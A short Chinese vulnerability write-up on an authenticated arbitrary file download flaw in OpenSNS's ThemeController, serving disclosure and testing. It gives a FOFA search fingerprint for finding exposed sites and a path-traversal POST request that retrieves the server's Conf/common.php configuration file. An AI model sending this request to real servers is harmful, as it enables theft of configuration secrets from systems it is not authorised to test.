# OpenSNS ThemeController.class.php 后台任意文件下载漏洞

## 漏洞描述

OpenSNS ThemeController.class.php文件中存在文件下载，其中过滤不足导致可以下载服务器任意文件

## 漏洞影响

```plain
OpenSNS
```

## FOFA

```plain
icon_hash="1167011145"
```

## 漏洞复现

登录页面如下

![202205181548621.png](/uploads/20260518/672709c0-3f2b-4803-bd5a-17a0e187b48d.png)

存在漏洞的文件为 `Application/Admin/Model/ThemeController.class.php`

![202205181548388.png](/uploads/20260518/64f48f17-87b0-49d0-a016-e87dfd2f056f.png)

其中 theme参数为用户可控参数，根据函数流程可以发现存在的文件将会打包为 zip文件提供下载

![202205181548023.png](/uploads/20260518/25640493-c762-4d1d-97ed-ce66c8e656e3.png)

构造请求

```plain
POST /admin.php?s=/theme/packageDownload

theme=../Conf/common.php
```
